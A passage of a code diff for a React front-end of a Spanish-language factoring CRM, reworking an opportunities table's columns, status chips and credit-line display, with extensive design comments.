-                          {(r.empresas || []).length > 0 && (
-                            <button onClick={() => setVerRegla((v) => ({ ...v, [r.id]: !v[r.id] }))} className="inline-flex items-center gap-1 rounded-md px-2 py-1 t9 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>
-                              {verRegla[r.id] ? <EyeOff size={11} /> : <Eye size={11} />} {verRegla[r.id] ? "Ocultar" : "Ver"} ({r.empresas.length})
-                            </button>
-                          )}
-                        </td>
-                      </tr>
-                      {verRegla[r.id] && (r.empresas || []).length > 0 && (
-                        <tr><td colSpan={6} className="px-2 pb-2"><PerfilDetalle empresas={r.empresas} /></td></tr>
-                      )}
-                    </Fragment>
-                  ))}
-                </tbody>
-              </table>
-
-              {/* Recomendaciones */}
-              <div className="mt-4 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>
-                Recomendaciones · {analisis.totalNoClas.toLocaleString("es-CL")} facturas sin clasificar ({fmtMM(analisis.montoNoClas)})
-              </div>
-              <div className="mt-1.5 t11 font-medium" style={{ color: C.ink }}>Reglas sugeridas (patrones más frecuentes no capturados)</div>
-              <div className="mt-1 space-y-1.5">
-                {analisis.perfiles.map((p, i) => (
-                  <div key={i} className="rounded-lg p-2" style={{ backgroundColor: C.page, border: `1px solid ${C.line}` }}>
-                    <div className="flex items-center justify-between gap-2">
-                      <div className="min-w-0">
-                        <div className="flex flex-wrap gap-1">
-                          {p.criterios.map((c) => <span key={c} className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#fff", color: C.sub, border: `1px solid ${C.line}` }}>{c}</span>)}
-                        </div>
-                        <div className="mt-0.5 t9" style={{ color: C.faint }}>{p.count} facturas · {fmtMM(p.montoMM)} · {(p.empresas || []).length} empresas</div>
-                      </div>
-                      <div className="flex shrink-0 items-center gap-1.5">
-                        <button onClick={() => setVerPerfil((v) => ({ ...v, [i]: !v[i] }))} className="flex items-center gap-1 rounded-md px-2.5 py-1.5 t10 font-medium" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>
-                          {verPerfil[i] ? <EyeOff size={12} /> : <Eye size={12} />} {verPerfil[i] ? "Ocultar" : "Ver"}
-                        </button>
-                        <button onClick={() => onRecomendar(p.criterios)} className="flex items-center gap-1 rounded-md px-2.5 py-1.5 t10 font-medium text-white" style={{ backgroundColor: C.indigo }}>
-                          <Plus size={12} /> Crear regla
-                        </button>
-                      </div>
-                    </div>
-                    {verPerfil[i] && (p.empresas || []).length > 0 && <PerfilDetalle empresas={p.empresas} />}
-                  </div>
-                ))}
-              </div>
-              <div className="mt-3 t11 font-medium" style={{ color: C.ink }}>Empresas a incorporar (proveedores recurrentes no clientes)</div>
-              <div className="mt-1 flex flex-wrap gap-1.5">
-                {analisis.empresas.map((e) => (
-                  <span key={e.cedente} className="rounded-lg px-2 py-1 t10" style={{ backgroundColor: C.page, border: `1px solid ${C.line}`, color: C.sub }}>
-                    <span className="font-medium" style={{ color: C.ink }}>{e.cedente}</span> · {e.count} fac. · Deudor: {e.pagador}{!e.esCliente && " · No cliente"}
-                  </span>
-                ))}
-              </div>
-            </>
-          )}
-          </>
-          )}
-          {tab === "cobranza" && analisis && analisis.cobranza && Object.keys(analisis.cobranza).length > 0 && (
-                <>
-                  <div className="mt-2 t11 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Cobranza por vencimiento · monto y facturas que debe cada deudor</div>
-                  <div className="mt-1.5 overflow-x-auto">
-                    <table className="w-full border-collapse t9">
-                      <thead><tr>
-                        <th className="px-2 py-1 text-left font-semibold" style={{ color: C.sub, borderBottom: `1px solid ${C.line}` }}>Deudor</th>
-                        {[1, 2, 3, 4, 5, 6, 7, 8].map((w) => (
-                          <th key={w} className="px-2 py-1 text-right font-semibold" style={{ color: C.sub, borderBottom: `1px solid ${C.line}` }}>{w === 1 ? "Próx. sem" : `${w} sem`}</th>
-                        ))}
-                        <th className="px-2 py-1 text-right font-semibold" style={{ color: C.ink, borderBottom: `1px solid ${C.line}` }}>Total</th>
-                      </tr></thead>
-                      <tbody>
-                        {Object.keys(analisis.cobranza).map((deudor) => {
-                          const row = analisis.cobranza[deudor];
-                          const tot = [1, 2, 3, 4, 5, 6, 7, 8].reduce((acc, w) => ({ monto: acc.monto + (row[w] ? row[w].monto : 0), fac: acc.fac + (row[w] ? row[w].fac : 0) }), { monto: 0, fac: 0 });
-                          return (
-                            <tr key={deudor} style={{ borderBottom: `1px solid ${C.line}` }}>
-                              <td className="whitespace-nowrap px-2 py-1 font-medium" style={{ color: C.ink }}>{deudor}</td>
-                              {[1, 2, 3, 4, 5, 6, 7, 8].map((w) => (
-                                <td key={w} className="whitespace-nowrap px-2 py-1 text-right" style={{ color: C.sub }}>
-                                  {row[w] ? <span>{fmtMM(row[w].monto)}<span style={{ color: C.faint }}> · {row[w].fac}f</span></span> : "—"}
-                                </td>
-                              ))}
-                              <td className="whitespace-nowrap px-2 py-1 text-right font-semibold" style={{ color: C.ink }}>{fmtMM(tot.monto)} · {tot.fac}f</td>
-                            </tr>
-                          );
-                        })}
-                      </tbody>
-                    </table>
-                  </div>
-                </>
-          )}
-        </div>
-      </div>
-    </>
-  );
-}
-
 // Reporte de cobranza standalone (con exportar a PDF).
 function MacroColumn({ title, hint, children }) {
   return (
@@ -7784,18 +9104,71 @@ function WaFlowLogin({ deal, onLogin }) {
 // ============================================================
 // Vista Tabla: grilla de oportunidades (alternativa al Kanban)
 // ============================================================
+// Chip de condición del tubo. Geometría ÚNICA para las cuatro compuertas —SOW en «Oferta»; línea,
+// otorgamiento y verificación en «Condición»—: mismo radio, padding, tipografía e ícono, y un
+// contador cuando hay pendientes. Los estados YA RESUELTOS (verdes) van sin relleno y con menos
+// peso: con varios chips llenos en la misma fila el ojo no encuentra dónde mirar, y lo que importa
+// es lo que falta por resolver. Vive a nivel de módulo para que ambas columnas usen el mismo.
+// El estado RESUELTO (verde) se distingue por el fondo transparente y el borde más tenue, no por el
+// peso: con dos pesos, dos estados del mismo indicador —«SOW en target» y «SOW bajando»— se leían
+// como dos tipografías distintas en la misma columna.
+function ChipCond({ fg, bg, Icono, texto, tip, badge }) {
+  const resuelto = fg === "#16A34A";
+  return (
+    <span className="inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9"
+      title={tip} style={{ backgroundColor: resuelto ? "transparent" : bg, color: fg, border: `1px solid ${fg}${resuelto ? "33" : "40"}`, fontWeight: 500, cursor: tip ? "help" : "default" }}>
+      {Icono && <Icono size={10} />}{texto}
+      {badge != null && <span className="flex h-4 minw5 items-center justify-center rounded-full px-1 t7 font-bold text-white" style={{ backgroundColor: fg }}>{badge}</span>}
+    </span>
+  );
+}
 function TablaOportunidades({ deals, onOpen, onMover, onReject, modoAsignar, onAsignarExec, mostrarEjec = true }) {
   const cargandoTabla = useCargaSimulada("tabla-oportunidades", 550); // placeholder del `loading` de la query
   const nextStage = (id) => { const i = STAGE_ORDER.indexOf(id); return STAGE_ORDER[Math.min(i + 1, STAGE_ORDER.length - 2)]; };
   // Ejecutivo: sólo se muestra a jefaturas/gerencias (más de un ejecutivo). Producto va dentro de
   // "Oportunidad" (p. ej. «Factoring OP-D922»). La columna de acciones sólo existe para asignar (Otras Empresas).
-  const cols = ["Oportunidad", ...(mostrarEjec ? ["Ejecutivo"] : []), "Monto", "Línea", "Condiciones de la oferta", "Etapa", "Estrategia", ...(modoAsignar ? ["Asignar"] : [])];
+  // «Cliente» identifica el negocio (cliente, producto, OP, etapa y SOW); «Línea» es la del cliente;
+  // «Oportunidad» lo que el motor encontró disponible; «Simulación» lo que el ejecutivo seleccionó y
+  // coteó; «Condición» las compuertas que deciden si avanza.
+  // REPARTO: las tres primeras se llevan el 65% del ancho (892 de 1372). Son las que están siempre
+  // pobladas —identidad, línea y análisis de deudores salen de la corrida horaria—, mientras que
+  // «Simulación» y «Condición» quedan vacías hasta que alguien simula, así que reservarles la mitad
+  // de la tabla dejaba media pantalla en blanco en el estado normal del tubo.
+  // Los anchos salen del contenido real: Cliente 372 por el chip de SOW («SOW 0% · en competencia»,
+  // ~155px) y los nombres largos; Oportunidad 370 para que su primera línea —«26 deudores · 31
+  // facturas · $1.982,5M», ~245px— nunca envuelva; Línea 150 por «$1.200M aprobada». A Simulación y
+  // Condición les queda el 35%: su texto y sus chips toleran el salto de línea, y en esas filas la
+  // altura ya la fija Oportunidad con sus cuatro líneas.
+  // Los anchos suman exactamente el minWidth de la tabla: por debajo corresponde scroll horizontal y
+  // no comprimir, porque comprimir hace envolver el texto y crecer el alto de la fila.
+  // El reparto va en PORCENTAJE y la tabla en `table-layout: fixed`: es la única forma de que la
+  // proporción se respete. Con el layout automático el navegador reparte según el contenido y las
+  // columnas de la derecha se llevaban más de lo asignado.
+  // Los pesos salen del ANCHO REAL del contenido de cada celda, no de un reparto parejo:
+  //   Cliente 21 → el nombre más largo con el chip de SOW mide ~210px; con 27 sobraban casi 200 y
+  //     abría un hueco entre el nombre y la columna Línea.
+  //   Línea 11 → «$1.000M aprobada» más la barra de uso.
+  //   Oportunidad 20 → su línea más ancha —«14 deudores · 16 facturas · $1.211,1M»— mide ~210px;
+  //     con 27 quedaba casi el doble de lo necesario.
+  //   Simulación 26 → es la más apretada de todas cuando hay oferta simulada: monto, tasa/anticipo/
+  //     plazo, giro/descuentos/comisión y la lista de deudores. Se lleva lo que sueltan las otras.
+  //   Condición 22 → dos chips por fila sin que ninguno envuelva.
+  // Suman 100 en la vista por defecto; con la columna Ejecutivo todo se reescala proporcionalmente.
+  // Los pesos están en PÍXELES de referencia sobre el ancho útil de la tabla (1.543 en el viewport de
+  // trabajo): suman exactamente ese total, así que cada columna cae en el ancho literal indicado y a
+  // la vez el reparto sigue siendo proporcional en pantallas más anchas o más angostas. Al agregarse
+  // la columna Ejecutivo todo se reescala solo, porque el ancho se calcula sobre la suma vigente.
+  const PESO_COL = { "Cliente": 294, "Línea": 230, "Oportunidad": 344, "Simulación": 675, "Ejecutivo": 140, "Asignar": 124 };
+  const cols = ["Cliente", ...(mostrarEjec ? ["Ejecutivo"] : []), "Línea", "Oportunidad", "Simulación", ...(modoAsignar ? ["Asignar"] : [])];
   return (
     <div className="flex flex-1 flex-col gap-2">
       <div className="flex-1 overflow-x-auto rounded-xl bg-white p-1" style={{ border: `1px solid ${C.line}` }}>
-      <table className="w-full border-collapse t11" style={{ minWidth: mostrarEjec ? "1330px" : "1190px" }}>
-        <thead><tr>{cols.map((h) => (
-          <th key={h} className="px-2 py-2 text-left font-semibold" style={{ color: C.sub, borderBottom: `1px solid ${C.line}`, position: "sticky", top: 0, backgroundColor: "#fff" }}>{h}</th>))}</tr></thead>
+      <table className="w-full border-collapse t11" style={{ minWidth: mostrarEjec ? "1640px" : "1500px", tableLayout: "fixed" }}>
+        <thead><tr>{(() => {
+          const totalPeso = cols.reduce((s2, c) => s2 + (PESO_COL[c] || 10), 0);
+          return cols.map((h) => (
+            <th key={h} className="px-2 py-2 text-left font-semibold" style={{ color: C.sub, borderBottom: `1px solid ${C.line}`, position: "sticky", top: 0, backgroundColor: "#fff", width: ((PESO_COL[h] || 10) / totalPeso * 100).toFixed(2) + "%" }}>{h}</th>));
+        })()}</tr></thead>
         <tbody>
           {/* Estado de carga: la consulta del tubo (oportunidades + líneas + otorgamiento) es de BD/API. */}
           {cargandoTabla && [0, 1, 2, 3, 4, 5].map((i) => (
@@ -7808,12 +9181,36 @@ function TablaOportunidades({ deals, onOpen, onMover, onReject, modoAsignar, onA
             const ns = nextStage(d.stage); const terminal = d.stage === "giro" || d.stage === "perdida";
             return (
               <tr key={d.id} onClick={() => onOpen(d)} title="Abrir detalle de la operación" className="pl-row cursor-pointer" style={{ borderBottom: `1px solid ${C.line}` }}>
-                {/* Oportunidad — incluye el producto junto al folio (p. ej. «Factoring OP-D922») */}
+                {/* Oportunidad — cliente, producto + folio, ETAPA y deudores. La etapa vive acá y no
+                    en una columna propia: es parte de la identidad de la oportunidad (dónde está), y los
+                    badges que la califican —giro, expirada, bloqueo firme de reglas— viajan con ella. */}
                 <td className="px-2 py-2.5 align-top">
                   <button onClick={() => onOpen(d)} className="text-left">
                     <div className="font-medium" style={{ color: C.indigo }}>{d.cliente}</div>
                     <div className="t9" style={{ color: C.faint }}><span className="font-semibold" style={{ color: TAG_COLORS[d.tag]?.fg || C.sub }}>{d.tag}</span> {d.id}</div>
-                    <div className="t9" style={{ color: C.sub }}>Deudores: {d.deudores && d.deudores[0] ? d.deudores[0].name : d.deudor}{d.deudores && d.deudores.length > 1 ? ` +${d.deudores.length - 1}` : ""}</div>
+                    <div className="mt-1">
+                    {(() => {
+                      const vis = ["prospeccion", "oferta", "aceptadas", "otorgamiento"].includes(d.stage) ? visadoDeal(d) : null;
+                      const nPend = vis ? vis.exc.length + vis.rechReev.length : 0;
+                      const bloqueo = vis && (vis.rechFirme.length || vis.excRech.length);
+                      const dstage = displayStageId(d); const disb = dealDisbursement(d); const res = dealResult(d);
+                      const dotStyle = d.stage === "oferta"
+                        ? { background: nPend ? "linear-gradient(135deg,#C4B5FD,#703EFF)" : "linear-gradient(135deg,#703EFF,#230C65)" }
+                        : { backgroundColor: (STAGES.find((s) => s.id === dstage) || {}).dot };
+                      return (<>
+                        <div className="flex items-center gap-1" style={{ color: C.ink }}><span className="h-2 w-2 rounded-full" style={dotStyle} />{stageName(dstage)}</div>
+                        {disb && <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: disb === "disbursed" ? "#F0FDF4" : "#eff6ff", color: disb === "disbursed" ? "#16A34A" : "#2563EB" }} title={disb === "disbursed" ? "Operación girada (desembolsada)" : "Aceptada · giro pendiente de desembolso"}>{DISBURSEMENT_LBL[disb]}</div>}
+                        {res === "expired" && <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: RESULT_COL.expired.bg, color: RESULT_COL.expired.fg }}>Expirada</div>}
+                        {bloqueo ? <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: "#fef2f2", color: "#EF4444", cursor: "help" }} title={"No superó reglas de otorgamiento (bloqueo firme):\n" + [...vis.rechFirme, ...vis.excRech].map((r, i) => `${i + 1}) #${r.n} ${r.nombre}`).join("\n")}><X size={10} /> Perdida · reglas de otorgamiento</div>
+                        : null}
+                      </>);
+                    })()}
+                    </div>
+                    {/* SOW: cuánto de este cliente tenemos frente a la competencia. Es un atributo del
+                        CLIENTE y no de la operación —no cambia con la oferta ni con la simulación—, así
+                        que su lugar es esta columna. En «Condición» convivía con las tres compuertas que
+                        sí deciden si la oferta avanza, y se leía como una más. */}
+                    {(() => { const sm = sowEstrategia(d); return sm ? <div className="mt-1"><ChipCond fg={sm.fg} bg={sm.bg} Icono={sm.Icon} texto={`SOW ${sm.lab}`} tip={sm.tip} /></div> : null; })()}
                   </button>
                 </td>
                 {/* Ejecutivo — sólo visible para jefaturas/gerencias (más de un ejecutivo) */}
@@ -7828,11 +9225,6 @@ function TablaOportunidades({ deals, onOpen, onMover, onReject, modoAsignar, onA
                   })()}
                 </td>
                 )}
-                {/* Monto de la oportunidad + nº de facturas */}
-                <td className="whitespace-nowrap px-2 py-2.5 align-top">
-                  <div className="font-semibold" style={{ color: C.ink }}>{fmtMM(d.amountMM)}</div>
-                  <div className="t9" style={{ color: C.faint }}>{d.facturas} factura{d.facturas === 1 ? "" : "s"}</div>
-                </td>
                 {/* Línea del cliente: APROBADA y DISPONIBLE. Antes esta columna mostraba la proyección
                     post-curse (uso + esta operación) contra la línea aprobada; era un dato derivado de la
                     oferta y no el estado de la línea. El ejecutivo necesita saber cuánto tiene aprobado y
@@ -7840,76 +9232,217 @@ function TablaOportunidades({ deals, onOpen, onMover, onReject, modoAsignar, onA
                 <td className="whitespace-nowrap px-2 py-2.5 align-top">
                   {(() => {
                     const L = lineaCreditoDe(d);
-                    if (!L.aprobada) return <span className="t9" style={{ color: C.faint }}>Sin línea</span>;
+                    if (!L.aprobada) return <span className="t10" style={{ color: C.faint }}>Sin línea</span>;
                     const usoPct = Math.max(0, Math.min(100, L.usoActual / L.aprobada * 100));
                     const sinCupo = L.disponible <= 0;
                     return (
-                      <div style={{ width: 148 }} title={`Línea aprobada ${fmtMM(L.aprobada)} · utilizada ${fmtMM(L.usoActual)} · disponible ${fmtMM(L.disponible)}`}>
-                        <div className="t10 font-semibold" style={{ color: C.ink }}>{fmtMM(L.aprobada)} <span className="font-normal" style={{ color: C.faint }}>aprobada</span></div>
-                        <div className="relative mt-1 h-1.5 w-full rounded-full" style={{ backgroundColor: "#EDEBF2" }}>
-                          <div className="absolute left-0 top-0 h-1.5 rounded-full" style={{ width: usoPct + "%", backgroundColor: "#9CA3AF" }} />
+                      <div style={{ width: 122 }} title={`Línea aprobada ${fmtMM(L.aprobada)} · utilizada ${fmtMM(L.usoActual)} · disponible ${fmtMM(L.disponible)}`}>
+                        {/* Tamaños homologados con la columna Monto: el monto en el tamaño base de la tabla
+                            (14px) semibold sobre C.ink y el calificativo en la escala de las sublíneas (t9),
+                            igual que "N facturas". El acento de la columna es el púrpura de marca (C.indigo):
+                            la línea de crédito es un atributo del cliente, no un resultado de la oferta, así que
+                            no comparte el verde de Giro ni el naranja de los estados. */}
+                        <div className="t10 font-semibold" style={{ color: C.ink }}>{fmtMM(L.aprobada)} <span className="t9 font-normal" style={{ color: C.indigo }}>aprobada</span></div>
+                        <div className="relative mt-1 h-1.5 w-full rounded-full" style={{ backgroundColor: C.line }}>
+                          <div className="absolute left-0 top-0 h-1.5 rounded-full" style={{ width: usoPct + "%", backgroundColor: C.indigo }} />
                         </div>
-                        <div className="mt-0.5 t9 font-semibold" style={{ color: sinCupo ? "#DC2626" : "#16A34A" }}>
+                        {/* Sin cupo sí rompe el púrpura: es un bloqueo, y ahí el rojo de la paleta es la señal. */}
+                        <div className="mt-1 t9 font-medium" style={{ color: sinCupo ? C.red : C.indigo }}>
                           {sinCupo ? "Sin cupo disponible" : `Disponible ${fmtMM(L.disponible)}`}
                         </div>
                       </div>
                     );
                   })()}
                 </td>
-                {/* Condiciones de la oferta */}
+                {/* OPORTUNIDAD: los DEUDORES que el motor encontró disponibles para este cliente —lo
+                    que ya está en la oferta más lo que todavía no—, en los tres tramos con que reparte
+                    la línea: Prime primero, después Nota Deudor sobre 4,2, al final el resto. Es lo que
+                    produce la corrida horaria, que ya no simula el negocio: la composición de deudores
+                    sí aguanta una hora, la tarifa no. Se actualiza sola cuando llegan facturas. */}
                 <td className="px-2 py-2.5 align-top" style={{ color: C.sub }}>
-                  {d.simulado ? (
-                    <div className="t10 leading-5">
-                      <span>Tasa <b style={{ color: C.ink }}>{d.tasa}</b> · Anticipo {d.anticipo} · {d.diasFin}d</span><br />
-                      <span>Giro <b style={{ color: C.green }}>{fmtMM(d.giroMM)}</b> · Desc. {fmtMM(d.descMM)} · Com. {fmtCLP(d.comision)}</span>
+                  {d.actualizando ? (
+                    <div title="Actualizando la oportunidad: se está re-analizando qué deudores entran con el paquete actualizado.">
+                      <Skel w={140} h={14} r={6} />
+                      <div className="mt-1"><Skel w={182} h={18} r={999} /></div>
+                      <div className="mt-1"><Skel w={140} h={18} r={999} /></div>
                     </div>
-                  ) : <span className="t10" style={{ color: C.faint }}>Sin simular</span>}
-                  {/* Proceso en background: re-simulación en curso tras la llegada de facturas nuevas. */}
-                  {d.actualizando && (
-                    <div className="mt-1.5 inline-flex items-center gap-1.5 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#F5F3FF", color: "#7C3AED" }}>
-                      <RotateCcw size={10} className="pl-spin" /> Actualizando la oportunidad…
-                    </div>
-                  )}
-                  {/* Indicador de facturas nuevas del cliente aún sin incorporar (mismo criterio/estilo que la tarjeta) */}
-                  {!d.actualizando && d.warning && ["prospeccion", "oferta"].includes(d.stage) && (
-                    <div className="mt-1.5 inline-flex items-center gap-1 rounded px-1.5 py-1 t10 font-medium" style={{ backgroundColor: "#FFF7ED", color: "#C2410C" }}>
-                      <AlertTriangle size={10} /> {d.nuevasFacturas} factura(s) nueva(s) · {fmtMM(d.nuevasFacturasMontoMM || 0)} sin incorporar
-                    </div>
-                  )}
-                </td>
-                {/* Etapa — Oferta en morado con degradé según otorgamiento pendiente (el naranja se leía como pérdida) */}
-                <td className="whitespace-nowrap px-2 py-2.5 align-top">
-                  {(() => {
-                    const vis = ["prospeccion", "oferta", "aceptadas", "otorgamiento"].includes(d.stage) ? visadoDeal(d) : null;
-                    const nPend = vis ? vis.exc.length + vis.rechReev.length : 0;
-                    const bloqueo = vis && (vis.rechFirme.length || vis.excRech.length);
-                    const dstage = displayStageId(d); const disb = dealDisbursement(d); const res = dealResult(d);
-                    const dotStyle = d.stage === "oferta"
-                      ? { background: nPend ? "linear-gradient(135deg,#C4B5FD,#703EFF)" : "linear-gradient(135deg,#703EFF,#230C65)" }
-                      : { backgroundColor: (STAGES.find((s) => s.id === dstage) || {}).dot };
+                  ) : (() => {
+                    const an = analisisDeudoresDeDeal(d);
+                    if (!an) return <span className="t10" style={{ color: C.faint }}>Sin deudores analizados</span>;
+                    // Los tres tramos se dibujan SIEMPRE, también en cero —el tramo ausente dice que no
+                    // hay nada de ese tipo, y ocultarlo dejaba la duda de si la columna lo mostraba— y
+                    // en cero se rotulan con el mismo conteo («0 deudores >4.2»), para que los tres se
+                    // lean en paralelo en vez de alternar entre afirmación y negación.
+                    // El conteo va CON su unidad dentro de la frase («★ 1 deudor Prime»): suelto entre
+                    // la etiqueta y el monto no se sabía si eran deudores o facturas.
+                    const chipTramo = (k, txt, fg, bg, tip) => {
+                      const hay = an[k].n > 0;
+                      return (
+                        <span key={k} className="inline-flex items-center gap-1 whitespace-nowrap rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: hay ? bg : "#EDEEF1", color: hay ? fg : C.sub, cursor: "help" }} title={tip}>
+                          {hay ? `${txt(an[k].n)} · ${fmtMM(an[k].montoMM)}` : txt(0)}
+                        </span>
+                      );
+                    };
+                    const plural = (n2, sing, plu) => `${n2} ${n2 === 1 ? sing : plu}`;
                     return (<>
-                      <div className="flex items-center gap-1" style={{ color: C.ink }}><span className="h-2 w-2 rounded-full" style={dotStyle} />{stageName(dstage)}</div>
-                      {disb && <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: disb === "disbursed" ? "#F0FDF4" : "#eff6ff", color: disb === "disbursed" ? "#16A34A" : "#2563EB" }} title={disb === "disbursed" ? "Operación girada (desembolsada)" : "Aceptada · giro pendiente de desembolso"}>{DISBURSEMENT_LBL[disb]}</div>}
-                      {res === "expired" && <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: RESULT_COL.expired.bg, color: RESULT_COL.expired.fg }}>Expirada</div>}
-                      {bloqueo ? <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: "#fef2f2", color: "#DC2626", cursor: "help" }} title={"No superó reglas de otorgamiento (bloqueo firme):\n" + [...vis.rechFirme, ...vis.excRech].map((r, i) => `${i + 1}) #${r.n} ${r.nombre}`).join("\n")}><X size={10} /> Perdida · reglas de otorgamiento</div>
-                      : nPend > 0 ? <div className="mt-1 inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-medium" style={{ backgroundColor: "#f5f3ff", color: "#7C3AED", cursor: "help" }} title={"Requiere otorgamiento — reglas con excepción/rechazo re-evaluable:\n" + [...vis.exc, ...vis.rechReev].map((e, i) => `${i + 1}) #${e.n} ${e.nombre}`).join("\n")}><AlertTriangle size={10} /> Requiere otorgamiento <span className="flex h-4 minw5 items-center justify-center rounded-full px-1 t9 font-bold text-white" style={{ backgroundColor: "#7c3aed" }}>{nPend}</span></div>
-                      : null}
+                      <div className="t10" title={`La OPORTUNIDAD reúne ${an.nDeudores} deudor(es) y ${an.nFacturas} factura(s) por ${fmtMM(an.montoMM)}: todo lo que el motor encontró disponible del cliente, esté o no en la oferta. «Monto» muestra sólo lo seleccionado, por eso las dos cifras no coinciden. El motor asigna línea en este orden: Prime, luego Nota Deudor sobre 4,2, y el resto con lo que sobre.`} style={{ color: C.sub, cursor: "help" }}>
+                        {/* Las tres cifras se destacan por igual —deudores, facturas y monto son la misma
+                            lectura— con el MISMO tratamiento que «$700M aprobada» en la columna Línea:
+                            t10 heredado del contenedor y `font-semibold`. Con <b> pesaban más que el
+                            propio título de la fila. */}
+                        <span className="font-semibold" style={{ color: C.ink }}>{an.nDeudores}</span> deudor{an.nDeudores === 1 ? "" : "es"} · <span className="font-semibold" style={{ color: C.ink }}>{an.nFacturas}</span> factura{an.nFacturas === 1 ? "" : "s"} · <span className="font-semibold" style={{ color: C.ink }}>{fmtMM(an.montoMM)}</span>
+                      </div>
+                      {/* Una fila por tramo, SIEMPRE: en columna los tres chips quedan alineados a la
+                          izquierda y se comparan de un vistazo entre filas del tubo. Con flex-wrap el
+                          reparto dependía del ancho de cada monto y los tramos bailaban de línea. */}
+                      <div className="mt-1 flex flex-col items-start gap-1">
+                        {chipTramo("prime", (n2) => `★ ${plural(n2, "deudor", "deudores")} Prime`, C.indigo, C.lilac,
+                          "Deudores Prime (Lista Blanca o Autorizados) y el monto que aportan a la oferta: son los primeros en tomar línea.")}
+                        {chipTramo("notaAlta", (n2) => `${plural(n2, "deudor", "deudores")} >4.2`, "#2563EB", "#EFF6FF",
+                          "Deudores no Prime con Nota Deudor sobre 4,2, y el monto que aportan: segundo tramo de prioridad al repartir la línea.")}
+                        {chipTramo("resto", (n2) => `${plural(n2, "otro deudor", "otros deudores")}`, "#9CA3AF", "#F3F4F6",
+                          "Deudores sin prioridad y el monto que aportan: toman sólo la línea que quede después de los dos tramos anteriores.")}
+                      </div>
                     </>);
                   })()}
                 </td>
-                {/* Estrategia (Share of Wallet) */}
-                <td className="px-2 py-2.5 align-top" style={{ maxWidth: 240 }}>
-                  {(() => {
-                    const sm = sowEstrategia(d);
-                    if (!sm) return <span className="t10" style={{ color: C.faint }}>—</span>;
-                    const SIcon = sm.Icon;
-                    return (
-                      <div title={sm.tip} style={{ cursor: "help" }}>
-                        <span className="inline-flex items-center gap-1 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: sm.bg, color: sm.fg }}><SIcon size={11} /> SOW {sm.lab}</span>
-                        <div className="mt-1 t9" style={{ color: C.sub, lineHeight: 1.35 }}>{sm.estr}</div>
-                      </div>
-                    );
-                  })()}
+                {/* SIMULACIÓN: todo lo que produce simular la oferta, en un panel único: monto,
+                    composición, condiciones comerciales y las compuertas que deciden si puede avanzar.
+                    Antes eran dos columnas —«Simulación» y «Condición»— que se llenaban y se vaciaban
+                    JUNTAS: sin simular las dos quedaban en blanco, y simuladas describían el mismo
+                    objeto desde dos ángulos. Reunidas se leen de izquierda a derecha: cuánto, de quién,
+                    a qué precio y qué falta para cursarlo. */}
+                {/* `align-middle`: la card se centra verticalmente en la fila. La altura la fijan
+                    «Cliente» y «Oportunidad», que son más altas, así que alineada arriba la card
+                    quedaba flotando con aire debajo —se nota sobre todo en «Sin simular», que es baja. */}
+                <td className="px-2 py-2.5 align-middle">
+                  {/* El padding vertical baja de 10 a 6: la card es la celda más alta de la fila —92px
+                      contra 82 de Cliente y 65 de Oportunidad— así que es la única que puede acortarla
+                      sin apretar el resto. Su interior (72) no se toca: los tres chips lo necesitan. */}
+                  <div className="rounded-xl px-3 py-1.5" style={{ backgroundColor: "#F3F2F7" }}>
+                    {d.actualizando ? (
+                      /* El esqueleto copia el ESTADO al que va a aterrizar la fila —`d.simulado` no
+                         cambia durante la recarga— con la misma altura interior de 72 que tienen los
+                         dos estados. Antes dibujaba siempre el estado rico y con `flex-wrap`: los
+                         cuatro bloques no cabían en una fila, envolvían en dos y la card daba un salto
+                         de alto al terminar. Y en filas que aterrizan en «Sin simular» prometía
+                         condiciones y compuertas que no iban a aparecer. */
+                      d.simulado ? (
+                        <div className="flex items-center gap-4" style={{ minHeight: 72 }} title="Actualizando la oportunidad: se están recalculando monto, condiciones y compuertas con el paquete actualizado.">
+                          <div className="flex shrink-0 justify-center" style={{ minWidth: 104 }}><Skel w={92} h={20} r={6} /></div>
+                          <div className="min-w-0" style={{ borderLeft: `1px solid ${C.line}`, paddingLeft: 16 }}>
+                            <div className="py-1"><Skel w={150} h={12} r={6} /></div>
+                            <div className="py-1"><Skel w={210} h={12} r={6} /></div>
+                            <div className="py-1"><Skel w={196} h={12} r={6} /></div>
+                          </div>
+                          <div className="flex shrink-0 flex-col gap-1" style={{ borderLeft: `1px solid ${C.line}`, paddingLeft: 16 }}>
+                            <Skel w={168} h={18} r={999} /><Skel w={186} h={18} r={999} /><Skel w={150} h={18} r={999} />
+                          </div>
+                        </div>
+                      ) : (
+                        <div className="flex items-center" style={{ minHeight: 72 }} title="Actualizando la oportunidad: se está recalculando con el paquete actualizado."><Skel w={96} h={14} r={6} /></div>
+                      )
+                    ) : !d.simulado ? (
+                      /* Sin simular la caja se muestra igual, vacía: deja ver que ahí va algo y que
+                         falta un paso, en vez de una celda en blanco que se lee como dato perdido. */
+                      <div className="t11 flex items-center" style={{ color: C.faint, minHeight: 72 /* +20 del padding vertical de la card = 92px, igual que la simulada */ }}
+                        title="La oferta aún no se ha simulado: monto, condiciones y compuertas se calculan al simular. El potencial disponible del cliente está en «Oportunidad».">Sin simular</div>
+                    ) : (() => {
+                      const aplicaGates = ["prospeccion", "oferta", "aceptadas", "otorgamiento"].includes(d.stage);
